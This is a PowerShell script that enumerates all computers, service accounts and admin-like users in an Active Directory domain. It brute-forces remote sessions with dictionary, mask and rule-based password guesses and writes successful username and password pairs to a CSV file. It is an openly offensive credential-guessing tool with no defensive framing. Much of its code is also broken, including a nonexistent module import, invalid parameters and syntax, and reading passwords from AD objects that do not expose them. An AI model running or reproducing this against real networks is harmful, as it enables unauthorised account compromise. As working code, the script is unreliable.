
Import-Module ActiveDirectory
Import-Module Import-PSSession


$domain = "YOUR_DOMAIN.COM" # Replace with your domain name
$computerList = Get-ADComputer -Filter * # Lists all computers in the domain
$dictionaryFile = "dictionary.txt" # File with list of keywords
$mask = "username?123" # Mask for dictionary attack with wildcard
$rulesFile = "password_rules.txt" # File with rules for hybrid brute force attack
$serviceAccountList = Get-ADServiceAccount -Filter * # Lists all service accounts
$adminAccountTypes = @("Builtin", "Group") # Types of local administrator accounts to test
$maxAttempts = 10 # Maximum number of login attempts
$timeout = 5 # Timeout for connection in seconds


function Test-Credentials($computer, $username, $password, $type) {
    try {
    
        $session = New-PSSession -ComputerName $computer -Credential (New-Object System.Management.Automation.PSCredential($username, $password)) -Timeout $timeout

        $logLine = "$($computer.Name),$($username),$($password),$($type),Access Granted,$(Get-Date),$($session.Latency)" | Out-File -FilePath "result.csv" -Append

        Remove-PSSession $session
    } catch {
        if ($_.Exception.Message -match "Credenciais inválidas") {
            $logLine = "$($computer.Name),$($username),$($password),$($type),Access Denied,$(Get-Date),$($_.Exception.Message)" | Out-File -FilePath "result.csv" -Append
        } else {
            Write-Error $_.Exception.Message
        }
    }
}

foreach ($computer in $computerList) {
    foreach ($line in Get-Content $dictionaryFile) {
        $username, $password = $line.Split(":")

        if ($mask) {
            $password = $mask -replace "?" $username[0]
        }

        if ($rulesFile) {
            foreach ($rule in Get-Content $rulesFile) {
                $password = $password + $rule
                Test-Credentials $computer $username $password "Hybrid"
            }
        } else {
            Test-Credentials $computer $username $password "Dictionary"
        }

        if ($attempts -ge $maxAttempts) {
            break
        }
        $attempts++
    }

    foreach ($serviceAccount in $serviceAccountList) {
        Test-Credentials $computer $serviceAccount.Name $serviceAccount.Password "Service"
    }

    foreach ($adminAccountType in $adminAccountTypes) {
        $adminAccounts = Get-ADUser -Filter "SamAccountName -like '*$($adminAccountType)*' -and AccountDisabled -eq $false"
        foreach ($adminAccount in $adminAccounts) {
            Test-Credentials $computer $adminAccount.SamAccountName $adminAccount.Password "Local Administrator"
        }
    }
}
